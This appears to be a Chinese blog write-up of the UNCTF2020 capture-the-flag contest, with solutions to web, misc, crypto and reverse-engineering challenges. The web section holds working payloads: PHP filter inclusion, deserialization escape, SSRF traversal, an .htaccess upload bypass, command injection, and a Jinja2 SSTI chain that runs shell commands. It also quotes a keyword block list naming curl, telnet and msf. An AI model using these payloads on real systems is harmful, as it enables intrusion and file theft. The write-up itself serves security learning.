---
title: UNCTF2020
date: 2020-11-14 21:30:51
updated: 2020-11-14 21:30:51
categories: Write up
---

第一次拿到名次的比赛，做出了27题<!--more-->

# web

## easyeval

```
?a=include$_GET["npfs"]?>&npfs=php://filter/read=convert.base64-encode/resource=flag.php
```



![](https://img.npfs06.top/20210405213339.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

base64解码即可



## easyunserialize

反序列化字符串逃逸

![](https://img.npfs06.top/20210405213349.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

  ```
{s:5:"uname";s:92:"easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge";s:8:"password";s:4:"easy";}";s:8:"password";i:1;}";
  ```



**payload:**

```
challengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";}
```



  

## easy_ssrf

考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF
php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。

- FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<a href='https://www.runoob.com/php/filter-validate-url.html' target='_blank'>https://www.runoob.com/php/filter-validate-url.html</a>

题目中要求url中存在 unctf.com
我们可以构造类似 `unctf.com/../../../ ` 这样的url，又因为我们需要查看flag文件

最终payload为 `url=unctf.com/../../../../../flag`



## ezphp

我们需要构造序列化后的username 和 password,但是我们不知道账号密码是什么（题目给的那个是迷惑你的）

bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true

![](https://img.npfs06.top/20210405213358.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## easy-upload

emmm和 De1CTF2020的check in没啥区别似乎

```
**perl|pyth|ph|auto|curl|base|\|>|rm|ryby|openssl|war|lua|msf|xter|telnet in contents!**
```



过滤了这些东西

经过测试发现我们上传的图片文件不能解析，因此我们可以上传一个`.htaccess`，添加其他后缀名解析为`.php`文件。如：`AddType application/x-httpd-php shell.ppt`。不过由于`php`字符串的过滤我们上传的文件不能包含`php`，因此我们上传的`.httacess`文件中的`php`可以用换行符绕过，对于上传了的`shell.ppt`文件，如果该php开启了短标签我们可以用短标签`<?=`来代替`<?php`

![](https://img.npfs06.top/20210405213409.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210405213418.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## UN's_online_tools

```
# 管道符

### windows 下

> `|`直接执行后面的语句
> `||`如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
> `&`前面和后面命令都要执行，无论前面真假
> `&&`如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令



### Linux 下

> `;`前面和后面命令都要执行，无论前面真假
> `|`直接执行后面的语句
> `||`如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
> `&`前面和后面命令都要执行，无论前面真假
> `&&`如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令
```

首先拿管道符测试下 127.0.0.1||ls

发现可以正确输出，不过读文件的时候发现部分字符被过滤了

先扫一下哪些字符被过滤了，808的这些都是被过滤了的

![](https://img.npfs06.top/20210405213431.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



看了下还有less没被过滤，空格用%09代替，一级级目录猜过去，一猜就中，文件名是flag，不过flag被过滤了，用下正则绕过 fla? 

payload如下：

![](https://img.npfs06.top/20210405213440.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)





## easyflask

dirsearch扫目录，/login和/register

注册admin,登入admin,这里题目没什么限制，可以直接注册admin,刚开始还以为考点是flask_session。。。。

登入成功之后，回到初始页面

提示 /secret_route_you_do_not_know

到该目录，又提示 ‘guess' the secret number 

所以 ` http://url//secret_route_you_do_not_know?guess={{config}}`

emmm.确定为SSTI

爆破下看下哪些字符被过滤



`[  __   "  `这些字符都被过滤了

```
[] 可以用gentitem绕过，getitem的用法为：__mro__[2]== __mro__.__getitem__(2)
__ 和 "(引号)可以用|attr绕过，例：{{()|attr(request.values.name1)}}&name1=class

```

```
payload:
?guess={{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(117)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('cat ./flag.txt').read()
```



![](https://img.npfs06.top/20210405213453.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)





# misc

## baba_is_you

![](https://img.npfs06.top/20210405213504.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

有个url进去看下，是b站的，评论第一条就是flag
![](https://img.npfs06.top/20210405213512.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## 爷的历险记

没啥好说的，直接拿存档编辑器，改下金币，到‘ 出题人商店 ’ 买下第三个hint3 就是flag


## 阴阳人编码

emmm Ook编码
“就这” 和 “不会吧” 全部替换成 Ook  ，倒过来的问号改成正过来的问号
![](https://img.npfs06.top/20210405213523.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

解密网址：https://www.splitbrain.org/services/ook

![](https://img.npfs06.top/20210405213538.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## YLB's CAPTCHA - 签到题



验证码连着输对十次，就可以得到flag



## 躲猫猫

后缀改成zip , 这个目录下 \list\xl\sharedStrings.xml

![](https://img.npfs06.top/20210405213551.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

base64解码就是flag 

## 被删除的flag

> strings flag



## 撕坏的二维码

emmmm. 直接找个正常的二维码，补一下就好



## EZ-IMAGE



![](https://img.npfs06.top/20210405213559.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



![](https://img.npfs06.top/20210405213608.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



![](https://img.npfs06.top/20210405213642.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## 网络深处1

audacity-2.4.2打开 频谱图，对照表得出电话号码

![](https://img.npfs06.top/20210405213713.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210405213728.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



15975384265

压缩包解密，得到的音频拿audacity-2.4.2打开 频谱图，如下

![](https://img.npfs06.top/20210405213739.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

Tupper自我指涉公式生成器,解密即可，脚本网址：https://github.com/HanSaloZu/Tupper-s-self-referential-formula-in-Python



https://keelyhill.github.io/tuppers-formula/这个网站可以直接得到

![](https://img.npfs06.top/20210405213801.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)





## 零

https://330k.github.io/misc_tools/unicode_steganography.html

网址直接解码即可



## 你能破解我的密码吗

> john shadow.txt

得到密码123456

MD5 32未小写加密即可

## mouse_click

（1）使用tshark 命令把pcap的数据提取并去除空行到`usbdata.txt`

```shell
tshark -r usb.pcap -T fields -e usb.capdata | sed '/^\s*$/d' > usbdata.txt
```

(2) 提取出来的数据可能会带冒号，也可能不带,如果不带冒号，用以下脚本加冒号

```python
f=open('usbdata.txt','r')
fi=open('out.txt','w')
while 1:
    a=f.readline().strip()
    if a:
        if len(a)==8:
            out=''
            for i in range(0,len(a),2):
                if i+2 != len(a):
                    out+=a[i]+a[i+1]+":"
                else:
                    out+=a[i]+a[i+1]
            fi.write(out)
            fi.write('\n')
    else:
        break

fi.close()
```

加冒号类似于这样:

```
00:00:01:00
00:ff:01:00
00:ff:01:00
00:ff:02:00
```

(3) 获取坐标内容

```
#sniffer.py
nums = []
keys = open('usbdata.txt','r')
result=open('result.txt','w')
posx = 0
posy = 0
for line in keys:
    x = int(line[2:4],16)
    y = int(line[5:7],16)
    if x > 127 :
        x -= 256
    if y >115 :
        y -=256
    posx += x
    posy += y
    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing
    if btn_flag == 1 : # 1 代表左键，2代表右键
        result.write(str(posx)+' '+str(-posy)+'\n')
keys.close()
result.close()
```

(4 ) 用gnuplot软件来画出鼠标生成的图像

```
gnuplot -e "plot 'result.txt' " -p
```

![](https://img.npfs06.top/20210405213814.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## 倒影

010editor打开，最下面，base64解密，解出来的字符串逆序，改后缀为zip

![](https://img.npfs06.top/20210405213823.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



暴力破解



![](https://img.npfs06.top/20210405213836.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## ET-MSG

转成30 X 80 的图

![](https://img.npfs06.top/20210405213847.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



按阿雷西博 1-10的加密规则，转成数字。如下：（注那个8改成0）

![](https://img.npfs06.top/20210405213859.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



7进制转ASCII即可

![](https://img.npfs06.top/20210405213914.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



# crypto

## 鞍山大法官开庭之缺的营养这一块怎么补

培根密码

![](https://img.npfs06.top/20210405213923.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

5个一组对出来就好了

peigenhenyouyingyang

结果最后的flag格式有点迷，提交了好多次才对

unctf{PEIGENHENYOUYINGYANG}



## 简单的RSA

e很大，维纳攻击

![](https://img.npfs06.top/20210405213932.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210405213945.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## easy-rsa

p=(a+b)/2

q=(a-b)/2

求出pq后，可以求m

```python
求m

import gmpy2
p=164976388739628973581511063883090363893890874421691770454048880284500992179926996908823840726558454111596699286948761026319434957217223527703429627592448959262532954019810985574583860227624287638908448719207441426500367172146028171043107126122608800640249201232870138119493156975216320985668013888561826953269
q=155422298738009940394189206134042119662513162560610248399569107132538620220590060772127789136918984458521940817304671619205395736161534795149599241668486283754795346411784845057685713557075371605135986388011998610261360520650827734187124699589734496097678970899686056997267797534053934064148348759788335157899

n = p * q  #模数
d = 13520637333215938186701232387959186078192441834430646200152017496580083015894693608744446669957196067379816242548412185148719678858906249430631086296059347471406865114774824686655919643954375513480029176520925196420025095437582404880108633026550155505640286905930669447727266167475328689082873003809052013145641561953548574050510799399063204788021266291024788348241346451907588463054320379080780429068578299089418923223030202618570767162875599171107099044497918583654800248238807175687675702792006125086389940138212608569298856353395124065366005586641202732989813698557545059249478652073299085605820622861917775089649

c =22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780
m=pow(c,d,n)
print(m)

```



![](https://img.npfs06.top/20210405214005.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210405213956.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## wing

![](https://img.npfs06.top/20210405214022.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

wingding2字体，对出来就好了

unctf{wingdings_is_incomprehensible}



## signin

写个脚本爆破下就好了

![](https://img.npfs06.top/20210405214032.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



```python
#!/usr/bin/python3

from string import printable
import itertools
from Crypto.Cipher import AES
from binascii import hexlify, unhexlify

pt = b'UNCTF2020_Enjoy_Crypto~'
val = len(pt) % 16
if not val == 0:
    pt += b'\x00'*(16 - val)
    print("pt==",pt)
yan= unhexlify(b'01a4e429e76db218fa0eb18f03ec69c9200a2362d8b4d7ea46170ce698389bbd')
print(yan)

table = {}

for p1 in itertools.product(printable, repeat=3):
    key = "".join(p1)
    key1 = "0000000000000"+key
    cipher1 = AES.new(key=key1.encode(), mode=AES.MODE_ECB)
    c1 = cipher1.encrypt(pt)
    table[c1] = key1

for p2 in itertools.product(printable, repeat=3):
    key = "".join(p2)
    key2 = key+"0000000000000"
    cipher2 = AES.new(key=key2.encode(), mode=AES.MODE_ECB)
    c2 = cipher2.decrypt(yan)
    # print("c2==",c2)
    if c2 in table:
        key1 = table[c2]
        print(key1, key2)
        break

flag = b"196cc94c2d685beb54beeaa14c1dc0a6f3794d65fca0d1a1274515166e4255ab367383092e42d774992f74bc138faaad"
flag = unhexlify(flag)
for key in [key2, key1]:
    cipher = AES.new(key=key.encode(), mode=AES.MODE_ECB)
    flag = cipher.decrypt(flag)
    print(flag)

```



```python
pt== b'UNCTF2020_Enjoy_Crypto~\x00\x00\x00\x00\x00\x00\x00\x00\x00'
b'\x01\xa4\xe4)\xe7m\xb2\x18\xfa\x0e\xb1\x8f\x03\xeci\xc9 \n#b\xd8\xb4\xd7\xeaF\x17\x0c\xe6\x988\x9b\xbd'
done creating lookup table
0000000000000W<& 0/i0000000000000
b'>\xfe4\x00\x96\x00\x13\\\xa9\xd8\xbb\xf8\xa2D\x8a\x1e\xbe\xec\xc2[\t\xf0\xe6]\xddO;#\xb8l\xc1\xaf\xd7&\xde\x1c\x94\x9az\x01\x92b\x83\xd3/\x8c\xf4P'
b'unctf{524e314a-5843-3030-5939-333230323541}\x05\x05\x05\x05\x05'
```



```

import itertools
a = (1, 2, 3)
b = ('A', 'B', 'C')
c = itertools.product(a,b)
for elem in c:
    print elem

(1, 'A')
(1, 'B')
(1, 'C')
(2, 'A')
(2, 'B')
(2, 'C')
(3, 'A')
(3, 'B')
(3, 'C')
```



# re

往下翻

在str1那 ctrl+u

![](https://img.npfs06.top/20210405214053.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



到了sub_401550函数这里

![](https://img.npfs06.top/20210405214103.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

下一个函数  sub_4015DC

选择数字 +R 即可转化为ascii

![](https://img.npfs06.top/20210405214115.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)